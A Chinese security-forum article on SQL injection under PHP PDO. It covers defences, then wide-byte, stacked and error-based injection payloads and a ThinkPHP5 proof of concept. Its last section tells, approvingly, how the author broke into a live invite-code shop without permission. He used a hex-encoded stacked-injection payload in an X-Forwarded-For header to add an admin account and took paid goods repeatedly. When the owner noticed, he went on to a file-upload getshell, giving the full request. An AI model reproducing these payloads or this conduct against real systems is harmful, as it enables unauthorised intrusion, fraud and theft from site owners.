0x01 PDO简介
----------

PDO全名PHP Data Object

PDO扩展为PHP访问数据库定义了一个轻量级的一致接口。PDO提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以使用相同的函数（方法）来查询和获取数据。

PHP连接MySQL数据库有三种方式（MySQL、Mysqli、PDO），列表性比较如下：

|  | Mysqli | PDO | MySQL |
|---|---|---|---|
| 引入的PHP版本 | 5.0 | 5.0 | 3.0之前 |
| PHP5.x是否包含 | 是 | 是 | 是 |
| 服务端prepare语句的支持情况 | 是 | 是 | 否 |
| 客户端prepare语句的支持情况 | 否 | 是 | 否 |
| 存储过程支持情况 | 是 | 是 | 否 |
| 多语句执行支持情况 | 是 | 大多数 | 否 |

如需在php中使用pdo扩展，需要在php.ini文件中进行配置

![image-20210525185836740](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-48f4fa02385d55a48bc7f17f8699ac03794e8a55.png)

0x02 PDO防范SQL注入
---------------

### ①调用方法转义特殊字符

**quote()方法(这种方法的原理跟addslashes差不多，都是转义)**

PDO类库的quate()方法会将输入字符串（如果需要）周围加上引号，并在输入字符串内转义特殊字符。

EG①:

```PHP
&lt;?php
$conn = new PDO('sqlite:/home/lynn/music.sql3');

/* Dangerous string */
$string = 'Naughty ' string';
print &quot;Unquoted string: $stringn&quot;;
print &quot;Quoted string:&quot; . $conn-&gt;quote($string) . &quot;n&quot;;
?&gt;
```

输出

```php
Unquoted string: Naughty ' string
Quoted string: 'Naughty '' string'
```

EG②

test.sql

```sql
SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for user
-- ----------------------------
DROP TABLE IF EXISTS `user`;
CREATE TABLE `user`  (
  `id` int(10) NOT NULL,
  `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NULL DEFAULT NULL,
  `password` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NULL DEFAULT NULL
) ENGINE = MyISAM CHARACTER SET = utf8 COLLATE = utf8_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of user
-- ----------------------------
INSERT INTO `user` VALUES (0, 'admin', 'admin');
INSERT INTO `user` VALUES (1, 'user', 'user');

SET FOREIGN_KEY_CHECKS = 1;

```

pdo.php

```php
&lt;?php
header('content-type=text/html;charset=utf-8');
$username=$_GET['username'];
$password=$_GET['password'];
try{
    $pdo=new PDO('mysql:host=localhost;dbname=test','root','root');
     $username=$pdo-&gt;quote($username);
     $password=$pdo-&gt;quote($password);
    $sql=&quot;select * from user where username={$username} and password={$password}&quot;;
    echo $sql.&quot;&lt;/br&gt;&quot;;
    $row=$pdo-&gt;query($sql);
    foreach ($row as $key =&gt; $value) {
        print_r($value);
    }

}catch(POOException $e){
    echo $e-&gt;getMessage();
}
```

访问http://localhost/pdo.php?username=admin&amp;password=admin

![image-20210525134031957](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-711b4262b176a83007071c083405e633e4c44970.png)

当我们使用单引号探测注入时

![image-20210525134219905](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-21843fcd2c2517318ad90d89466eb03ae461ec7b.png)

如图，单引号已被反斜线转义

### ②**预编译语句**

**1、占位符-通过命名参数防止注入**

通过命名参数防止注入的方法会使得程序在执行SQL语句时，将会把参数值当成一个字符串整体来进行处理，即使参数值中包含单引号，也会把单引号当成单引号字符，而不是字符串的起止符。这样就在某种程度上消除了SQL注入攻击的条件。

将原来的SQL查询语句改为

```sql
Select * from where name=:username and password=:password
```

prepare方法进行SQL语句预编译

最后通过调用rowCount()方法，查看返回受sql语句影响的行数

返回0语句执行失败，大于等于1，则表示语句执行成功。

All code

```php
&lt;?php
header('content-type:text/html;charset=utf-8');
$username=$_GET['username'];
$password=$_GET['password'];
try{
    $pdo=new PDO('mysql:host=localhost;dbname=test','root','root');
    $sql='select * from user where name=:username and password=:password';
    $stmt=$pdo-&gt;prepare($sql);
    $stmt-&gt;execute(array(&quot;:username&quot;=&gt;$username,&quot;:password&quot;=&gt;$password));
    echo $stmt-&gt;rowCount();
}catch(PDOException $e){
    echo $e-&gt;getMessage();
}
?&gt;
```

查询成功

![查询成功](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8d6863fc7adeee9ef0212adf61d34f5a609fc0fc.png)

注入失败

![image-20210525140039170](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1a02a03a596f6391b85a073a471d1f7e63c83f85.png)

**2、占位符-通过问号占位符防止注入**

把SQL语句再进行修改

```sql
select * from user where name=? and password=?
```

同上，prepare方法进行SQL语句预编译

最后调用rowCount()方法，查看返回受sql语句影响的行数

```php
&lt;?
header('content-type:text/html;charset=utf-8');
$username=$_GET['username'];
$password=$_GET['password'];
try{
    $pdo=new PDO('mysql:host=localhost;dbname=test','root','root');
    $sql=&quot;select * from user where username=? and password=?&quot;;
    $stmt=$pdo-&gt;prepare($sql);
    $stmt-&gt;execute(array($username,$password));
    echo $stmt-&gt;rowCount();

}catch(PDOException $e){
    echo $e-&gt;getMessage();
}
?&gt;
```

效果同上

查询成功

![查询成功](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8d6863fc7adeee9ef0212adf61d34f5a609fc0fc.png)

注入失败

![image-20210525140039170](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1a02a03a596f6391b85a073a471d1f7e63c83f85.png)

**3.通过bindParam()方法绑定参数防御SQL注入**

修改语句部分

```php
$sql='select * from user where name=:username and password=:password';
    $stmt=$pdo-&gt;prepare($sql);
    $stmt-&gt;bindParam(&quot;:username&quot;,$username,PDO::PARAM_STR);
    $stmt-&gt;bindParam(&quot;:password&quot;,$password,PDO::PARAM_STR);
```

**解释：**  
a)：:username 和 :password为命名参数  
b)：$username;$password为获取的变量，即用户名和密码。  
c)：PDO::PARAM\_STR,表示参数变量的值一定要为字符串，即绑定参数类型为字符串。在bindparam()方法中，默认绑定的参数类型就是字符串。

​ 当你要接受int型数据的时候可以绑定参数为PDO::PARAM\_INT.

```php
&lt;?php
header('content-type:text/html;charset=utf-8');
$username=$_GET['username'];
$password=$_GETT['password'];
try{
    $pdo=new PDO('mysql:host=localhost;dbname=test','root','root');
    $sql='select * from user where name=:username and password=:password';
    $stmt=$pdo-&gt;prepare($sql);
    $stmt-&gt;bindParam(&quot;:username&quot;,$username,PDO::PARAM_STR);
    $stmt-&gt;bindParam(&quot;:password&quot;,$password,PDO::PARAM_STR);
    $stmt-&gt;execute();
    echo $stmt-&gt;rowCount();

}catch(PDOException $e){
    echo $e-&gt;getMessage();
}
?&gt;
```

效果同上

查询成功

![查询成功](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8d6863fc7adeee9ef0212adf61d34f5a609fc0fc.png)

注入失败

![image-20210525140039170](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1a02a03a596f6391b85a073a471d1f7e63c83f85.png)

这只是总结了一部分PDO防范SQL注入的方法，仍有方法请见下文

其他手法还有很多，大家感兴趣的话可以自行研究

0x03 PDO下的注入手法与思考
-----------------

读完前文后，读者们可能不由感叹，真狠啊，什么都tmd转义，什么语句都预编译了，这我tmd注入个毛...

![image-20210525143226397](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6b4d1b7a084c0f8c994a9c8b3e1e570437f41680.png)

![img](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c1aa005c5db9197724774f7f59d84bc1371c16c0.jpg)

北宋宰相王安石有言“看似寻常最奇崛,成如容易却艰辛”

让我们抽丝剥茧来探寻PDO下的注入手法

目前在PDO下，比较通用的手法主要有如下两种

### **①宽字节注入**

注入的原理就不讲了，相信大家都知道

一张图，清晰明了

![image-20210525144401689](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-50e22ac32aedac64d2ca1e05146145a5417d0cd0.png)

当Mysql数据库my.ini文件中设置编码为gbk时，

我们的PHP程序哪怕使用了addslashes()，PDO::quote，mysql\_real\_escape\_string()、mysql\_escape\_string()等函数、方法，或配置了magic\_quotes\_gpc=on，依然可以通过构造%df'的方法绕过转义

### ②堆叠注入与报错注入

PDO分为**模拟预处理**和**非模拟预处理**。

**模拟预处理是防止某些数据库不支持预处理而设置的，也是众多注入的元凶**

在初始化PDO驱动时，可以设置一项参数，PDO::ATTR\_EMULATE\_PREPARES，作用是打开模拟预处理(true)或者关闭(false),默认为true。

PDO内部会模拟参数绑定的过程，SQL语句是在最后execute()的时候才发送给数据库执行。

**非模拟预处理则是通过数据库服务器来进行预处理动作，主要分为两步：**

第一步是prepare阶段，发送SQL语句模板到数据库服务器；

第二步通过execute()函数发送占位符参数给数据库服务器执行。

**PDO产生安全问题的主要设置如下：**

&gt; ​ PDO::ATTR\_EMULATE\_PREPARES //模拟预处理(默认开启)  
&gt;  
&gt; ​ PDO::ATTR\_ERRMODE //报错  
&gt;  
&gt; ​ PDO::MYSQL\_ATTR\_MULTI\_STATEMENTS //允许多句执行(默认开启)

PDO默认是允许多句执行和模拟预编译的，在用户输入参数可控的情况下，会导致堆叠注入。

#### 2.1 没有过滤的堆叠注入情况

```php
&lt;?php
header('content-type=text/html;charset=utf-8');
$username=$_GET['username'];
$password=$_GET['password'];
try{
    $pdo=new PDO('mysql:host=localhost;dbname=test','root','root');
    $sql=&quot;select * from user where username='{$username}' and password='{$password}'&quot;;
    echo $sql.&quot;&lt;/br&gt;&quot;;
    $row=$pdo-&gt;query($sql);
    foreach ($row as $key =&gt; $value) {
        print_r($value);
    }

}catch(POOException $e){
    echo $e-&gt;getMessage();
}
```

因为在$pdo&gt;query()执行之前，我们便可以对$sql进行非法操作，那PDO相当于没用

![image-20210525161109702](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-dbe1b639fe95553d88626f2a57293323f8e38c6c.png)

![image-20210525160856876](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-db10941a50f530ae4f67ad15b719fd095ce91915.png)

如果想禁止多语句执行，可在创建PDO实例时将PDO::MYSQL\_ATTR\_MULTI\_STATEMENTS设置为false

```php
new PDO($dsn, $user, $pass, array(PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; false))
```

但是哪怕禁止了多语句执行，也只是防范了堆叠注入而已，直接union即可

![image-20210525191231332](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-64d6c268e77a066543869b7db1d4946670ed818c.png)

#### 2.2 模拟预处理的情况

```php
&lt;?php
try {
    $pdo=new PDO('mysql:host=localhost;dbname=test','root','root');
    //$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
    $username = $_GET['username'];
    $sql = &quot;select id,&quot;.$_GET['role'].&quot; from user where username = ?&quot;;
    $stmt = $pdo-&gt;prepare($sql);
    $stmt-&gt;bindParam(1,$username);
    $stmt-&gt;execute();
    while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))
    {
        var_dump($row);
        echo &quot;&lt;br&gt;&quot;;
    }
} catch (PDOException $e) {
    echo $e;
}

```

$role是可控的，导致可实现堆叠注入和in line query

![image-20210526015752434](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-612a13f847bd9882a521d68d292e5370d905c637.png)

![image-20210526005239112](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3967039d72cf36c03c78eb3c8bb31d1a039cc5cf.png)

#### 2.3当设置PDO::ATTR\_ERRMODE和PDO::ERRMODE\_EXCEPTION开启报错时

设置方法

```php
$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
```

无论是否开启PDO::ATTR\_EMULATE\_PREPARES-模拟预处理

此时SQL语句如果产生报错，PDO则会将报错抛出

除设置错误码之外，PDO 还将抛出一个 PDOException 异常类并设置它的属性来反射错误码和错误信息。

此设置在调试期间也非常有用，因为它会有效地放大脚本中产生错误的点，从而可以非常快速地指出代码中有问题的潜在区域

在这种情况下可以实现error-based SQL Injection

使用GTID\_SUBSET函数进行报错注入

```sql
http://192.168.1.3/pdo.php?role=id OR GTID_SUBSET(CONCAT((MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,190))),6700)&amp;username=admin&amp;username=admin
```

![image-20210526013121010](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fc9673fe210756cac6bdcfd1fd8aeface56d8005.png)

#### 2.4 非模拟预处理的情况

```php
&lt;?php
try {
    $pdo=new PDO('mysql:host=localhost;dbname=test','root','root');
    $pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
    $username = $_GET['username'];
    $sql = &quot;select id,&quot;.$_GET['role'].&quot; from user where username = ?&quot;;
    $stmt = $pdo-&gt;prepare($sql);
    $stmt-&gt;bindParam(1,$username);
    $stmt-&gt;execute();
    while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))
    {
        var_dump($row);
        echo &quot;&lt;br&gt;&quot;;
    }
} catch (PDOException $e) {
    echo $e;
}
```

此时堆叠注入已经歇逼

![image-20210526015916363](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-74a55059621425ed268c9b3773d2bda0b257253f.png)

但inline query，报错注入依然坚挺可用

![image-20210526014840025](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1c4b2dfd407863367205351a90434eab00ff5fae.png)

### ③一个安全的case

只要语句内存在有用户非纯字符可控部分，便不够安全；那我们就用非模拟预处理sql写法

```php
$dbh-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false); 
```

它会告诉 PDO 禁用模拟预处理语句，并使用 real parepared statements 。

这可以确保SQL语句和相应的值在传递到mysql服务器之前是不会被PHP解析的（禁止了所有可能的恶意SQL注入攻击）。

如下为一个安全使用PDO的case

```php
$pdo = new PDO('mysql:dbname=testdatabase;host=localhost;charset=utf8', 'root', 'root');
$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
$stmt = $pdo-&gt;prepare('SELECT * FROM wz_admin WHERE id = :id');
$stmt-&gt;execute(array('id' =&gt; $id));
print_r($stmt -&gt; fetchAll ());
exit();
```

&gt; 当调用 prepare() 时，查询语句已经发送给了数据库服务器，此时只有占位符  
&gt;  
&gt; 发送过去，没有用户提交的数据；当调用到 execute()时，用户提交过来的值才会传送给数据库，它们是分开传送的，两者独立的，SQL注入攻击者没有一点机会

0x04 案例剖析-ThinkPHP5中PDO导致的一个鸡肋注入(来自Phithon师傅)
---------------------------------------------

我们来看Phithon师傅几年前博客发的一个case

<https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html>

```php
&lt;?php
namespace app\index\controller;

use app\index\model\User;

class Index
{
    public function index()
    {
        $ids = input('ids/a');
        $t = new User();
        $result = $t-&gt;where('id', 'in', $ids)-&gt;select();
    }
}
```

如上述代码，如果我们控制了in语句的值位置，即可通过传入一个数组，来造成SQL注入漏洞。

文中已有分析，我就不多说了，但说一下为什么这是一个SQL注入漏洞。IN操作代码如下：

```php
&lt;?php
...
$bindName = $bindName ?: 'where_' . str_replace(['.', '-'], '_', $field);
if (preg_match('/\W/', $bindName)) {
    // 处理带非单词字符的字段名
    $bindName = md5($bindName);
}
...
} elseif (in_array($exp, ['NOT IN', 'IN'])) {
    // IN 查询
    if ($value instanceof \Closure) {
        $whereStr .= $key . ' ' . $exp . ' ' . $this-&gt;parseClosure($value);
    } else {
        $value = is_array($value) ? $value : explode(',', $value);
        if (array_key_exists($field, $binds)) {
            $bind  = [];
            $array = [];
            foreach ($value as $k =&gt; $v) {
                if ($this-&gt;query-&gt;isBind($bindName . '_in_' . $k)) {
                    $bindKey = $bindName . '_in_' . uniqid() . '_' . $k;
                } else {
                    $bindKey = $bindName . '_in_' . $k;
                }
                $bind[$bindKey] = [$v, $bindType];
                $array[]        = ':' . $bindKey;
            }
            $this-&gt;query-&gt;bind($bind);
            $zone = implode(',', $array);
        } else {
            $zone = implode(',', $this-&gt;parseValue($value, $field));
        }
        $whereStr .= $key . ' ' . $exp . ' (' . (empty($zone) ? &quot;''&quot; : $zone) . ')';
    }
```

可见，`$bindName`在前边进行了一次检测，正常来说是不会出现漏洞的。但如果`$value`是一个数组的情况下，这里会遍历`$value`，并将`$k`拼接进`$bindName`。

也就是说，我们控制了预编译SQL语句中的键名，也就说我们控制了预编译的SQL语句，这理论上是一个SQL注入漏洞。那么，为什么原文中说测试SQL注入失败呢？

这就是涉及到预编译的执行过程了。通常，PDO预编译执行过程分三步：

1. `prepare($SQL)` 编译SQL语句
2. `bindValue($param, $value)` 将value绑定到param的位置上
3. `execute()` 执行

这个漏洞实际上就是控制了第二步的`$param`变量，这个变量如果是一个SQL语句的话，那么在第二步的时候是会抛出错误的：

[![sp170704_025805.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1c61d23f6002e3ab4d00bace340cbfa3acc2a0bc.png)](https://www.leavesongs.com/media/attachment/2017/07/04/d6c994da-94af-4fef-a6c6-584de29f5929.png)

所以，这个错误“似乎”导致整个过程执行不到第三步，也就没法进行注入了。

但实际上，在预编译的时候，也就是第一步即可利用。我们可以做有一个实验。编写如下代码：

```PHP
&lt;?php
$params = [
    PDO::ATTR_ERRMODE           =&gt; PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_EMULATE_PREPARES  =&gt; false,
];

$db = new PDO('mysql:dbname=cat;host=127.0.0.1;', 'root', 'root', $params);

try {
    $link = $db-&gt;prepare('SELECT * FROM table2 WHERE id in (:where_id, updatexml(0,concat(0xa,user()),0))');
} catch (\PDOException $e) {
    var_dump($e);
}
```

执行发现，虽然我只调用了prepare函数，但原SQL语句中的报错已经成功执行：

[![sp170704_032524.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fadd9326683e0deeeefd8db4c9b38bfb64fa0f3c.png)](https://www.leavesongs.com/media/attachment/2017/07/04/52d04bac-33d8-4c8e-be6c-5ed5878fa387.png)

究其原因，是因为我这里设置了`PDO::ATTR_EMULATE_PREPARES =&gt; false`。

这个选项涉及到PDO的“预处理”机制：因为不是所有数据库驱动都支持SQL预编译，所以PDO存在“模拟预处理机制”。如果说开启了模拟预处理，那么PDO内部会模拟参数绑定的过程，SQL语句是在最后`execute()`的时候才发送给数据库执行；如果我这里设置了`PDO::ATTR_EMULATE_PREPARES =&gt; false`，那么PDO不会模拟预处理，参数化绑定的整个过程都是和Mysql交互进行的。

非模拟预处理的情况下，参数化绑定过程分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器（parsing-&gt;resolution），第二步是多次发送占位符参数给mysql服务器进行执行（多次执行optimization-&gt;execution）。

这时，假设在第一步执行`prepare($SQL)`的时候我的SQL语句就出现错误了，那么就会直接由mysql那边抛出异常，不会再执行第二步。我们看看ThinkPHP5的默认配置：

```php
...
// PDO连接参数
protected $params = [
    PDO::ATTR_CASE              =&gt; PDO::CASE_NATURAL,
    PDO::ATTR_ERRMODE           =&gt; PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_ORACLE_NULLS      =&gt; PDO::NULL_NATURAL,
    PDO::ATTR_STRINGIFY_FETCHES =&gt; false,
    PDO::ATTR_EMULATE_PREPARES  =&gt; false,
];
...
```

可见，这里的确设置了`PDO::ATTR_EMULATE_PREPARES =&gt; false`。所以，终上所述，我构造如下POC，即可利用报错注入，获取user()信息：

[http://localhost/thinkphp5/public/index.php?ids\[0,updatexml(0,concat(0xa,user()),0)\]=1231](http://localhost/thinkphp5/public/index.php?ids%5B0,updatexml(0,concat(0xa,user()),0)%5D=1231)

[![sp170704_021313.png](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bbcc651c211389a9b04bbf12783bed0d300f6d06.png)](https://www.leavesongs.com/media/attachment/2017/07/04/2d22af8c-04ec-4b7d-9fb3-0709ae5c4ab0.png)

但是，如果你将user()改成一个子查询语句，那么结果又会爆出`Invalid parameter number: parameter was not defined`的错误。

因为没有过多研究，说一下我猜测：预编译的确是mysql服务端进行的，但是预编译的过程是不接触数据的 ，也就是说不会从表中将真实数据取出来，所以使用子查询的情况下不会触发报错；虽然预编译的过程不接触数据，但类似user()这样的数据库函数的值还是将会编译进SQL语句，所以这里执行并爆了出来。

0x05 实战案例-从cl社区激活码到Git 2000+ Star项目0day
---------------------------------------

#### 5.1 起因

挖SRC，做项目做的心生烦闷，前几日忍不住在家看1024(cl)社区，越看越来劲，邪火攻心，想搜片看

奈何cl社区一向奉行邀请制，邀请码又很难搞到，可谓让人十分不爽

于是本人去google上找了一个卖1024社区邀请码的站

![image-20210526023044553](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1497d21388eae72ea17ec1140127675d5aa62c2c.png)

88块钱....虽然不算贵，但售卖这种东西本来就是不受法律保护的。作为一个JB小子，怎么可能不动点白嫖心思？

在黑盒测试了一段时间后，发现支付逻辑和前台都没什么安全问题。。难道我真的要花钱买这激活码？？？？

不可能，绝对不可能。

看到网站底部有一个Powered by xxx，呵呵呵，好家伙，不出意外这应该就是这个站用的CMS系统了

![image-20210526023227963](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0079afc25c4c3cee6a9b40d27e95f5ed8d089e8e.png)

去Git上一搜，还真有，2000多个Star，作者维护了好几年，也算是个成熟的项目了。

直接把最新版源码下载下来，丢进PHPstorm里开始审计

#### 5.2 从审计思路到PDO导致的前台XFF堆叠注入

就我个人而言，拿到一套源码，我更喜欢黑白盒相结合；根据前台能访问到的功能点来确定自己审计的目标

简单看了一下整套系统是MVC架构的，使用了PDO，使用有部分过滤规则；后台默认路径是/admin

看了一遍前台的功能点，发现在查询订单处路径名很有趣，带有一个/query，直接搜一下页面上关键词，跟进入到源码中

![image-20210526024734021](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d7d3436b45dd5142677d4cdb2bad7667fbd459a7.png)

发现了如下的一段code

![image-20210526025356848](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e80f4bc6b8b4dc5b5a706ce0dc87739694fee2d6.png)

PDO均为默认配置，立马想到了堆叠注入

经测试orderid用户可控，全局搜索orderid发现，orderid经函数方法后被处理为纯字符串，没有注入余地，故选择另辟蹊径

后发现ip参数用户同样可控，在调用select方法前没做任何处理。

ip参数调用的是getClientIP方法，我们跟一下getClientIP方法

![image-20210526030817917](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4e5e2618cd71f052cba28ffb1bc6f7df19350387.png)

很好理解，就是从常见的http header中获取客户端IP

但是非常高兴，ip参数未做任何处理，我们可以通过构造XFF头来实现堆叠注入

因为有csrf\_token的校验，我们必须在查询订单的页面，随便输入个订单号，随后输入正确的验证码，随后查询才有效

随后手动构造XFF头，进行针对PDO的堆叠注入

因为PDO处为双引号进行语句闭合，且属于无回显的堆叠注入

故构造Payload为

```php
X-FORWARDED-For:1';select sleep(5)#
```

![image-20210526202008945](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f0c03bc48e67832e7f2e5d9c3736545752030e2e.png)

延迟了5s，注入成功。

针对这种没回显的堆叠注入，盲注太慢，用Dnslog OOB又太慢，所以选择构造一个添加后台管理员的insert payload

```php
X-FORWARDED-For:1“;insert into t_admin_user values(99,&quot;test@test.test&quot;,&quot;76b1807fc1c914f15588520b0833fbc3&quot;,&quot;78e055&quot;,0);
```

但是现实是很残酷的，测试发现，在XFF头中，1"将语句闭合后只要出现了引号或者逗号，就会引发报错，SQL语句无法执行

但是具有一定审计经验的兄弟一定会想到，PDO下Prepare Statement给我们提供了绕过过滤进行注入的沃土

山重水复疑无路，柳暗花明又一村

#### 5.3 Prepare Statement构造注入语句

**知识补充 --- Prepare Statement写法**

MySQL官方将prepare、execute、deallocate统称为PREPARE STATEMENT(预处理)

预制语句的SQL语法基于三个SQL语句：

```sql
prepare stmt_name from preparable_stmt;
execute stmt_name [using @var_name [, @var_name] ...];
{deallocate | drop} prepare stmt_name;
```

给出MYSQL中两个简单的demo

```php
set@a=&quot;select user()&quot;;PREPARE a FROM @a;execute a;select sleep(3);#
set@a=0x73656C65637420757365722829;PREPARE a FROM @a;execute a;select sleep(3);#  
//73656C65637420757365722829为select user() 16进制编码后的字符串，前面再加上0x声明这是一个16进制字符串
```

Prepare语句在防范SQL注入方面起到了非常大的作用，但是对于SQL注入攻击却也提供了新的手段。

Prepare语句最大的特点就是它可以将16进制串转为语句字符串并执行。如果我们发现了一个存在堆叠注入的场景，但过滤非常严格，便可以使用prepare语句进行绕过。

将我们的insert语句直接hex编码

![image-20210526200448332](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b40012f483942af617e4f2f6722674393d39a1a6.png)

构造注入语句

```php
X-FORWARDED-For:1&quot;;set@a=0x696E7365727420696E746F20745F61646D696E5F757365722076616C7565732839392C227465737440746573742E74657374222C223736623138303766633163393134663135353838353230623038333366626333222C22373865303535222C30293B;PREPARE a FROM @a;execute a;select sleep(3);#
//sleep用于判断注入是否成功
```

![image-20210526201816276](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-595b041e1319da72f126599f52bd0d31ebb43fd2.png)

延时3s，注入成功，成功添加了一个账号为test@test.test，密码为123456的后台管理员

直接默认后台路径/admin登录后台

![image-20210526202209072](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8ceb7ffde5715b1c16d159b6b94570549e84c42e.png)

前台提交一个cl社区邀请码的订单

后台修改订单状态为确认付款

![image-20210526202525849](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-608d2a47f070899095f9e4daa475e9fde0278e50.png)

没过一会，邀请码直接到邮箱

![image-20210526202705629](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-54c7b681a58f80ad49a836fbbc5dc793f96f2fb7.png)

以后可以搜片看了

![image-20210526202913110](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-08d87ad7a8a0e10f4343247e92f3c0a9e281fc8d.png)

![ä¿å­ä¿å­å¨é¨ä¿å­ï¼ç»§ç»­ååï¼](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2469a7fe07fc495caf687828fce006dceebccdc5.jpg)

#### 5.4 不讲武德被发现

在不讲武德，连续薅了几个邀请码，发给朋友后

站长终于发现了

![image-20210526203058983](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c4db0c13c9741fede8abe0fa786947357e5b523b.png)

八嘎，既然发现了，那就干脆把你的站日下来吧，然后好好擦擦屁股，免得0day被这站长抓走

![çå°´å°¬å](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-42d03618eaa9e316e6a2c1a00baf6f571abdc958.jpg)

#### 5.5 后台Getshell审计(Thanks 17@M78sec)

经测试后台的文件上传处鉴权比较严格，没法直接前台getshell

但是后台文件上传处，没有对文件扩展名进行任何过滤，只有一处前端js校验，所以后台getshell直接白给

![image-20210526205833957](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6103bd357ce69a11fa6bc887facf6cb4f11f926c.png)

文件上传后不会返回上传路径，但上传路径和上传文件的命名规则我们已经了如指掌

![image-20210526204139761](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-10b2f235b17e1e8be2cbcbaf25491e3ca460f51b.png)

UPLOAD\_PATH定义如下

```php
define('UPLOAD_PATH', APP_PATH.'/public/res/upload/');
```

CUR\_DATE定义如下

```php
define('CUR_DATE', date('Y-m-d'));
```

文件名

```php
$filename=date(&quot;His&quot;);  //小时+分钟+秒
```

以我现在21点05分钟为例，输出结果如下

![image-20210526210650296](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-47af59104db05b8e731d4cf34f3471be9200b3b6.png)

以2021年5月26日的21点05分44秒为例

完整的文件路径即为

```php
http://www.xxx.com/res/upload/2021-05-26/210444.php
```

直接构造表单

```html
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;form action=&quot;http://xxx.top/Admin/products/imgurlajax&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
    &lt;label for=&quot;file&quot;&gt;File:&lt;/label&gt;
    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;
    &lt;input type=&quot;text&quot; name=&quot;pid&quot; id=&quot;pid&quot; /&gt;  &lt;--! pid记得自行修改为商品的id(后台选择商品抓包即可获取)--&gt;&lt;/--!&gt;
    &lt;input type=&quot;submit&quot; value=&quot;Upload&quot; /&gt;
&lt;/form&gt;
```

同时需要添加Referer: [http://xxx.top/Admin/products/imgurl/?id=1,并修改下方的](http://xxx.top/Admin/products/imgurl/?id=1,%E5%B9%B6%E4%BF%AE%E6%94%B9%E4%B8%8B%E6%96%B9%E7%9A%84)

否则会提示“请选择商品id”

最后完整的上传http request如下

```http
POST http://xxx.top/Admin/products/imgurlajax HTTP/1.1
Host: xxxx
Content-Length: 291
Accept: application/json, text/javascript, */*; q=0.01
DNT: 1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeSrhtSPGxub0H0eb
Origin: http://47.105.132.207
Referer: http://xxx.top/Admin/products/imgurl/?id=12
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=ql4ep5uk8cf9i0rvihrruuilaq
Connection: close

------WebKitFormBoundaryeSrhtSPGxub0H0eb
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.php&quot;
Content-Type: image/png

&lt;?php
    phpinfo();
------WebKitFormBoundaryeSrhtSPGxub0H0eb
Content-Disposition: form-data; name=&quot;pid&quot;

12
------WebKitFormBoundaryeSrhtSPGxub0H0eb--
```

直接上传成功

随后通过burpsuite Intruder来跑一下最后的秒数

毕竟秒数不能拿捏的那么精准

![image-20210526212753095](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4281220709ff606a2e5a99100a60b33ec6c405a1.png)

